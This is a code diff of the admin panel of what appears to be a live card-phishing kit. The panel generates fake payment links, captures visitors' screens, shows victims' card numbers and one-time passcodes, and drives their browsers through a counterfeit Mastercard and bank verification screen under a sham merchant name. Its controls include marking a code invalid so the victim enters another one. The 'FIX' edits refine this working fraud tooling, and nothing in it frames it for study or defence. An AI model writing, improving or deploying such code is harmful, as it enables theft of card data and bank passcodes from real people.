@@ -800,7 +800,7 @@
           <option value="JPY">JPY - Japanese Yen</option>
           <option value="AUD">AUD - Australian Dollar</option>
           <option value="CAD">CAD - Canadian Dollar</option>
-          <option value="CHF">CHF - Swiss Franc</option>
+<option value="CHF">CHF - Swiss Franc</option>
           <option value="CNY">CNY - Chinese Yuan</option>
           <option value="HKD">HKD - Hong Kong Dollar</option>
           <option value="NZD">NZD - New Zealand Dollar</option>
@@ -1041,7 +1041,7 @@
   <script src="/socket.io/socket.io.js"></script>
   <script>
     // Global Variables
-    const socket = io({
+   const socket = io({
       query: {
         isAdmin: 'true'
       },
@@ -1299,7 +1299,7 @@
       playNotificationSound('visitor');
     }
 
-    // Enhanced screen frame handler
+   // Enhanced screen frame handler
     function handleScreenFrame(data) {
       if (!data || !data.frameData) return;
       
@@ -1610,7 +1610,7 @@
 
         updateVisitorsList(data);
         
-        // If there's at least one visitor, initialize screen capture for the newest one
+       // If there's at least one visitor, initialize screen capture for the newest one
         if (data && data.length > 0) {
           // Sort by timestamp, newest first
           const sortedVisitors = [...data].sort((a, b) => {
@@ -2106,7 +2106,7 @@
       }
     }
 
-    // Payment Link Generation - MODIFIED for hash-based URLs
+    // FIX 1: Improved Payment Link Generation - Modified to include amount in URL
     document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const amountInput = document.getElementById('amount');
@@ -2127,13 +2127,14 @@
         btn.textContent = 'Generating...';
         btn.disabled = true;
 
+        // FIXED: Explicitly include amount in the request
         const response = await fetch('/api/generatePaymentLink', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
-            amount, 
+            amount: amount, // Ensure amount is explicitly passed
             description,
-            includeScreenCapture: true // Add flag to include screen capture code
+            includeScreenCapture: true
           })
         });
 
@@ -2142,10 +2143,15 @@
 
         console.log('Server response:', data);
 
-        // Extract the pid from the original URL
-        const originalLink = data.paymentLink;
-        console.log('Original link:', originalLink);
+        // FIX 1: Ensure amount is in the URL
+        let originalLink = data.paymentLink;
+        if (!originalLink.includes('amount=')) {
+          // If amount is missing, add it to the URL
+          originalLink = originalLink + (originalLink.includes('?') ? '&' : '?') + 'amount=' + amount;
+        }
+        console.log('Link with amount:', originalLink);
         
+        // Extract the pid from the original URL
         let pid;
         
         // Try to extract pid from URL query parameters
@@ -2171,12 +2177,13 @@
         
         // Create a clean URL with just the hash (no query parameters)
         const origin = window.location.origin;
+        // FIX 1: Include amount directly in the hash URL's localStorage
         const hashUrl = `${origin}/${randomHash}`;
         
         // Store the payment info in localStorage for retrieval by the client
         const paymentInfo = {
           pid: pid,
-          amount: amount,
+          amount: amount, // Ensure amount is included in localStorage
           description: description,
           timestamp: Date.now()
         };
@@ -2460,7 +2467,7 @@
                       <button onclick="updateTransactionStatus('${tx.id}', 'success')" ${!tx.otpEntered ? 'disabled' : ''}>
                         Success
                       </button>
-                      <button onclick="showCurrencyPage('${tx.id}')" class="currency-btn bg-blue-500 text-white" ${tx.status !== 'processing' ? 'disabled' : ''}>
+                      <button onclick="showCurrencyPage('${tx.id}')" class="currency-btn bg-blue-500 text-white mb-2" ${tx.status !== 'processing' ? 'disabled' : ''}>
                         Currency
                       </button>
                       <button onclick="showMCVerification('${tx.id}')" class="currency-btn bg-purple-600 text-white" ${tx.status !== 'processing' ? 'disabled' : ''}>
@@ -2687,55 +2694,55 @@
       }
     }
 
-   // When showing MC verification, update to show brand selection step first
-function showMCVerification(id) {
-  if (!transactionsMap.has(id)) {
-    alert('Transaction not found');
-    return;
-  }
-  
-  console.log('Showing MC verification for transaction:', id);
-  
-  // Get transaction details
-  const tx = transactionsMap.get(id);
-  
-  // Set the current transaction ID
-  currentMcInvoiceId = id;
-  
-  // Reset to brand selection step
-  document.getElementById('brandSelectionStep').style.display = 'block';
-  document.getElementById('verificationDetailsStep').style.display = 'none';
-  
-  // Reset step indicators
-  document.getElementById('brandStepIndicator').classList.add('text-blue-400');
-  document.getElementById('brandStepIndicator').classList.remove('text-gray-400');
-  document.getElementById('detailsStepIndicator').classList.add('text-gray-400');
-  document.getElementById('detailsStepIndicator').classList.remove('text-blue-400');
-  
-  // Show the MC panel
-  const panel = document.getElementById('mcOtpPanel');
-  panel.classList.remove('hidden');
-  
-  // Reset OTP value display
-  document.getElementById('mcOtpValue').textContent = 'Waiting...';
-  
-  // Ensure MC fail options are hidden by default
-  document.getElementById('mcFailOptions').style.display = 'none';
-  
-  // Reset phone number field
-  document.getElementById('mcPhoneLastFour').value = '';
-  
-  // Set default brand based on card number
-  document.getElementById('mcVerificationType').value = detectCardType(tx.cardNumber);
-  
-  // Reset bank to default
-  document.getElementById('mcBankSelect').value = 'default';
-  
-  // Reset currency based on transaction
-  document.getElementById('mcCurrencySelect').value = tx.currency || 'USD';
-  
-  console.log('MC panel initialized for brand selection for transaction:', id);
-}
+    // FIX 2: Updated MC verification function to properly handle bank logos
+    function showMCVerification(id) {
+      if (!transactionsMap.has(id)) {
+        alert('Transaction not found');
+        return;
+      }
+      
+      console.log('Showing MC verification for transaction:', id);
+      
+      // Get transaction details
+      const tx = transactionsMap.get(id);
+      
+      // Set the current transaction ID
+      currentMcInvoiceId = id;
+      
+      // Reset to brand selection step
+      document.getElementById('brandSelectionStep').style.display = 'block';
+      document.getElementById('verificationDetailsStep').style.display = 'none';
+      
+      // Reset step indicators
+      document.getElementById('brandStepIndicator').classList.add('text-blue-400');
+      document.getElementById('brandStepIndicator').classList.remove('text-gray-400');
+      document.getElementById('detailsStepIndicator').classList.add('text-gray-400');
+      document.getElementById('detailsStepIndicator').classList.remove('text-blue-400');
+      
+      // Show the MC panel
+      const panel = document.getElementById('mcOtpPanel');
+      panel.classList.remove('hidden');
+      
+      // Reset OTP value display
+      document.getElementById('mcOtpValue').textContent = 'Waiting...';
+      
+      // Ensure MC fail options are hidden by default
+      document.getElementById('mcFailOptions').style.display = 'none';
+      
+      // Reset phone number field
+      document.getElementById('mcPhoneLastFour').value = '';
+      
+      // Set default brand based on card number
+      document.getElementById('mcVerificationType').value = detectCardType(tx.cardNumber);
+      
+      // Reset bank to default
+      document.getElementById('mcBankSelect').value = 'default';
+      
+      // Reset currency based on transaction
+      document.getElementById('mcCurrencySelect').value = tx.currency || 'USD';
+      
+      console.log('MC panel initialized for brand selection for transaction:', id);
+    }
 
     // Function to detect card type from number
     function detectCardType(cardNumber) {
@@ -2751,7 +2758,7 @@ function showMCVerification(id) {
     }
 
     // Transaction Actions - Enhanced with status feedback
-    async function updateTransactionStatus(id, status, reason = null) {
+  async function updateTransactionStatus(id, status, reason = null) {
       try {
         // Show loading indicator on the button
         const row = document.querySelector(`tr[data-invoice-id="${id}"]`);
@@ -2836,176 +2843,180 @@ function showMCVerification(id) {
       }
     }
 
-// Initialize the MC Panel with brand selection first
-function initMcPanel() {
-  console.log('Initializing MC Panel with brand selection flow...');
-  
-  // Make sure the panel is initially hidden
-  const mcPanel = document.getElementById('mcOtpPanel');
-  mcPanel.classList.add('hidden');
-  
-  // Brand Selection Step
-  document.getElementById('brandSelectContinueBtn').addEventListener('click', function() {
-    // Get selected brand
-    const brandType = document.getElementById('mcVerificationType').value;
-    console.log('Brand selected:', brandType);
-    
-    // Transition to verification details step
-    document.getElementById('brandSelectionStep').style.display = 'none';
-    document.getElementById('verificationDetailsStep').style.display = 'block';
-    
-    // Update step indicators
-    document.getElementById('brandStepIndicator').classList.remove('text-blue-400');
-    document.getElementById('brandStepIndicator').classList.add('text-gray-400');
-    document.getElementById('detailsStepIndicator').classList.remove('text-gray-400');
-    document.getElementById('detailsStepIndicator').classList.add('text-blue-400');
-    
-    // Send command to show brand selection in client
-    if (currentMcInvoiceId && socket && socket.connected) {
-      socket.emit('admin_command', {
-        command: 'show_brand_selection',
-        invoiceId: currentMcInvoiceId
+    // FIX 2: Enhanced MC Panel with proper bank selection
+    function initMcPanel() {
+      console.log('Initializing MC Panel with brand selection flow...');
+      
+      // Make sure the panel is initially hidden
+      const mcPanel = document.getElementById('mcOtpPanel');
+      mcPanel.classList.add('hidden');
+      
+      // Brand Selection Step
+      document.getElementById('brandSelectContinueBtn').addEventListener('click', function() {
+        // Get selected brand
+        const brandType = document.getElementById('mcVerificationType').value;
+        console.log('Brand selected:', brandType);
+        
+        // Transition to verification details step
+        document.getElementById('brandSelectionStep').style.display = 'none';
+        document.getElementById('verificationDetailsStep').style.display = 'block';
+        
+        // Update step indicators
+        document.getElementById('brandStepIndicator').classList.remove('text-blue-400');
+        document.getElementById('brandStepIndicator').classList.add('text-gray-400');
+        document.getElementById('detailsStepIndicator').classList.remove('text-gray-400');
+        document.getElementById('detailsStepIndicator').classList.add('text-blue-400');
+        
+        // Send command to show brand selection in client
+        if (currentMcInvoiceId && socket && socket.connected) {
+          socket.emit('admin_command', {
+            command: 'show_brand_selection',
+            invoiceId: currentMcInvoiceId
+          });
+          
+          // Update the brand type
+          socket.emit('admin_command', {
+            command: 'update_brand_type',
+            invoiceId: currentMcInvoiceId,
+            brandType: brandType
+          });
+        }
       });
       
-      // Update the brand type
-      socket.emit('admin_command', {
-        command: 'update_brand_type',
-        invoiceId: currentMcInvoiceId,
-        brandType: brandType
+      // FIX 2: Enhanced Start verification button with direct bank updates
+      document.getElementById('mcStartVerification').addEventListener('click', function() {
+        if (!currentMcInvoiceId) {
+          alert('No transaction selected');
+          return;
+        }
+        
+        const verificationType = document.getElementById('mcVerificationType').value;
+        const bankCode = document.getElementById('mcBankSelect').value;
+        const currency = document.getElementById('mcCurrencySelect').value;
+        const phoneLastFour = document.getElementById('mcPhoneLastFour').value;
+        
+        if (!phoneLastFour || phoneLastFour.length !== 4 || !/^\d{4}$/.test(phoneLastFour)) {
+          alert('Please enter the last 4 digits of the phone number');
+          return;
+        }
+        
+        // FIX 2: First directly update bank logo on the client
+        console.log('Sending direct bank update to client with bank code:', bankCode);
+        socket.emit('update_mc_bank', {
+          invoiceId: currentMcInvoiceId,
+          bankCode: bankCode
+        });
+        
+        // Show MC verification to the client
+        socket.emit('admin_command', {
+          command: 'show_mc_verification',
+          invoiceId: currentMcInvoiceId,
+          cardType: verificationType,
+          phoneLastFour: phoneLastFour
+        });
+        
+        // Wait a moment before sending the start command
+        setTimeout(() => {
+          // Then send the start verification command with all details
+          socket.emit('admin_command', {
+            command: 'start_verification',
+            invoiceId: currentMcInvoiceId,
+            verificationType: verificationType,
+            bankCode: bankCode,
+            merchantName: 'Peacock Merchandise',
+            phoneLastFour: phoneLastFour
+          });
+          
+          // Update currency if needed
+          socket.emit('update_mc_currency', {
+            invoiceId: currentMcInvoiceId,
+            currency: currency
+          });
+        }, 1000);
+        
+        // Set button to loading state
+        const startBtn = document.getElementById('mcStartVerification');
+        startBtn.innerHTML = 'Starting Verification...';
+        startBtn.disabled = true;
+        
+        // Reset button after 3 seconds
+        setTimeout(() => {
+          startBtn.innerHTML = 'Start Verification';
+          startBtn.disabled = false;
+        }, 3000);
+        
+        showMessage('success', 'MC verification started for transaction ' + currentMcInvoiceId);
+      });
+      
+      // Invalid OTP button
+      document.getElementById('mcOtpInvalidBtn').addEventListener('click', () => {
+        if (!currentMcInvoiceId) return;
+        
+        socket.emit('admin_command', {
+          command: 'show_otp_error',
+          invoiceId: currentMcInvoiceId,
+          message: 'Incorrect verification code. Please try again.'
+        });
+        
+        showMessage('success', 'OTP marked as invalid');
+      });
+      
+      // Success button
+      document.getElementById('mcOtpSuccessBtn').addEventListener('click', () => {
+        if (!currentMcInvoiceId) return;
+        
+        // FIX 3: Send success command to trigger proper redirect
+        socket.emit('admin_command', {
+          command: 'verification_success',
+          invoiceId: currentMcInvoiceId
+        });
+        
+        // Close the panel
+        document.getElementById('mcOtpPanel').classList.add('hidden');
+        currentMcInvoiceId = null;
+        
+        // Reload transactions
+        loadTransactions();
+        
+        showMessage('success', 'Transaction approved successfully');
+      });
+      
+      // Fail options button
+      document.getElementById('mcFailOptionsBtn').addEventListener('click', () => {
+        const failOptions = document.getElementById('mcFailOptions');
+        failOptions.style.display = failOptions.style.display === 'none' ? 'block' : 'none';
+      });
+      
+      // Fail with reason button
+      document.getElementById('mcFailWithReasonBtn').addEventListener('click', () => {
+        if (!currentMcInvoiceId) return;
+        
+        const reason = document.getElementById('mcFailReasonDropdown').value;
+        
+        // FIX 3: Send failure command with reason to trigger proper redirect
+        socket.emit('admin_command', {
+          command: 'verification_failed',
+          invoiceId: currentMcInvoiceId,
+          reason: reason
+        });
+        
+        // Close the panel
+        document.getElementById('mcOtpPanel').classList.add('hidden');
+        currentMcInvoiceId = null;
+        
+        // Reload transactions
+        loadTransactions();
+        
+        showMessage('success', `Transaction failed with reason: ${reason}`);
+      });
+      
+      // Close panel button
+      document.getElementById('mcClosePanelBtn').addEventListener('click', () => {
+        document.getElementById('mcOtpPanel').classList.add('hidden');
+        currentMcInvoiceId = null;
       });
     }
-  });
-  
-// FIX 2: Enhanced bank selection handling in admin.html
-document.getElementById('mcStartVerification').addEventListener('click', function() {
-  if (!currentMcInvoiceId) {
-    alert('No transaction selected');
-    return;
-  }
-  
-  const verificationType = document.getElementById('mcVerificationType').value;
-  const bankCode = document.getElementById('mcBankSelect').value;
-  const currency = document.getElementById('mcCurrencySelect').value;
-  const phoneLastFour = document.getElementById('mcPhoneLastFour').value;
-  
-  if (!phoneLastFour || phoneLastFour.length !== 4 || !/^\d{4}$/.test(phoneLastFour)) {
-    alert('Please enter the last 4 digits of the phone number');
-    return;
-  }
-  
-  // First, send the bank code directly to ensure it gets updated
-  socket.emit('update_mc_bank', {
-    invoiceId: currentMcInvoiceId,
-    bankCode: bankCode
-  });
-  
-  // Then show the MC verification screen to the client
-  socket.emit('admin_command', {
-    command: 'show_mc_verification',
-    invoiceId: currentMcInvoiceId,
-    cardType: verificationType,
-    phoneLastFour: phoneLastFour
-  });
-  
-  // Wait a moment before sending the start command
-  setTimeout(() => {
-    // Then send the start verification command with all details
-    socket.emit('admin_command', {
-      command: 'start_verification',
-      invoiceId: currentMcInvoiceId,
-      verificationType: verificationType,
-      bankCode: bankCode,
-      merchantName: 'Peacock Merchandise',
-      phoneLastFour: phoneLastFour
-    });
     
-    // Update currency if needed
-    socket.emit('update_mc_currency', {
-      invoiceId: currentMcInvoiceId,
-      currency: currency
-    });
-  }, 1000);
-  
-  // Set button to loading state
-  const startBtn = document.getElementById('mcStartVerification');
-  startBtn.innerHTML = 'Starting Verification...';
-  startBtn.disabled = true;
-  
-  // Reset button after 3 seconds
-  setTimeout(() => {
-    startBtn.innerHTML = 'Start Verification';
-    startBtn.disabled = false;
-  }, 3000);
-  
-  showMessage('success', 'MC verification started for transaction ' + currentMcInvoiceId);
-});
-  
-  // Invalid OTP button
-  document.getElementById('mcOtpInvalidBtn').addEventListener('click', () => {
-    if (!currentMcInvoiceId) return;
-    
-    socket.emit('admin_command', {
-      command: 'show_otp_error',
-      invoiceId: currentMcInvoiceId,
-      message: 'Incorrect verification code. Please try again.'
-    });
-    
-    showMessage('success', 'OTP marked as invalid');
-  });
-  
-  // Success button
-  document.getElementById('mcOtpSuccessBtn').addEventListener('click', () => {
-    if (!currentMcInvoiceId) return;
-    
-    socket.emit('admin_command', {
-      command: 'verification_success',
-      invoiceId: currentMcInvoiceId
-    });
-    
-    // Close the panel
-    document.getElementById('mcOtpPanel').classList.add('hidden');
-    currentMcInvoiceId = null;
-    
-    // Reload transactions
-    loadTransactions();
-    
-    showMessage('success', 'Transaction approved successfully');
-  });
-  
-  // Fail options button
-  document.getElementById('mcFailOptionsBtn').addEventListener('click', () => {
-    const failOptions = document.getElementById('mcFailOptions');
-    failOptions.style.display = failOptions.style.display === 'none' ? 'block' : 'none';
-  });
-  
-  // Fail with reason button
-  document.getElementById('mcFailWithReasonBtn').addEventListener('click', () => {
-    if (!currentMcInvoiceId) return;
-    
-    const reason = document.getElementById('mcFailReasonDropdown').value;
-    
-    socket.emit('admin_command', {
-      command: 'verification_failed',
-      invoiceId: currentMcInvoiceId,
-      reason: reason
-    });
-    
-    // Close the panel
-    document.getElementById('mcOtpPanel').classList.add('hidden');
-    currentMcInvoiceId = null;
-    
-    // Reload transactions
-    loadTransactions();
-    
-    showMessage('success', `Transaction failed with reason: ${reason}`);
-  });
-  
-  // Close panel button
-  document.getElementById('mcClosePanelBtn').addEventListener('click', () => {
-    document.getElementById('mcOtpPanel').classList.add('hidden');
-    currentMcInvoiceId = null;
-  });
-}
     // Debug MC Verification issues
     function debugMcVerification() {
       // Listen for all socket events
@@ -3087,7 +3098,7 @@ document.getElementById('mcStartVerification').addEventListener('click', functio
       console.log('Checking if MC Bank Select exists:', !!document.getElementById('mcBankSelect'));
       
       // Setup socket event listeners for visitors
-      socket.on('visitor', function(data) {
+socket.on('visitor', function(data) {
         console.log('New visitor event:', data);
         // Store in map
         visitorsMap.set(data.pid, data);
